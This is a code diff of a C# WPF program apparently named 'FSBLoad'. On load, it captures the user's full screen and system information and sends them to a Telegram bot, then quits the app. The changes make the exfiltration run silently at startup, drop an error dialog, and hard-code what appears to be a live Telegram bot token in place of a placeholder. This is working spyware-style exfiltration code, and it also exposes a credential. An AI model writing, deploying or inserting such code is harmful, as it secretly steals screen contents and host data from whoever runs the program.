@@ -22,11 +22,11 @@ namespace FSBLoad
 			InitializeComponent();
 		}
 
-		private static async Task Send()
+		private static async void Send()
 		{
 			try
 			{
-				var bot = new TelegramBotClient("TOKEN");
+				var bot = new TelegramBotClient("5292015239:AAG7M6gs9AN-cShhmac3LnHooRJN4_y4eho");
 
 				byte[] buf = GetScreenshot();
 				MemoryStream ms = new MemoryStream(buf);
@@ -38,11 +38,15 @@ namespace FSBLoad
 					photo: ms, caption: cap);
 
 				ItHasBeenSent = true;
-
 			}
 			catch (Exception ex)
 			{
 				System.Windows.MessageBox.Show(ex.Message, "Телега сдохла");
+			}
+			finally
+			{
+				await Task.Delay(3000);
+				System.Windows.Application.Current.Shutdown();
 			}
 		}
 
@@ -52,16 +56,13 @@ namespace FSBLoad
 				e.Cancel = true;
 		}
 
-		private async void Window_Loaded(object sender, RoutedEventArgs e)
+		private void pb_Loaded(object sender, RoutedEventArgs e)
 		{
-			await Send();
+			Send();
 		}
 
 		private static byte[] GetScreenshot()
 		{
-			try
-			{
-
 				Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
 				Graphics graphics = Graphics.FromImage(printscreen as System.Drawing.Image);
 				graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
@@ -69,13 +70,6 @@ namespace FSBLoad
 				MemoryStream ms = new MemoryStream();
 				printscreen.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
 				return ms.ToArray();
-
-			}
-			catch (Exception ex)
-			{
-				System.Windows.MessageBox.Show(ex.Message, "Проблема со скрином");
-				return null;
-			}
 		}
 
 		private static string GetInfo()
@@ -112,6 +106,7 @@ namespace FSBLoad
 
 			return str;
 		}
+
 	}
 }
 
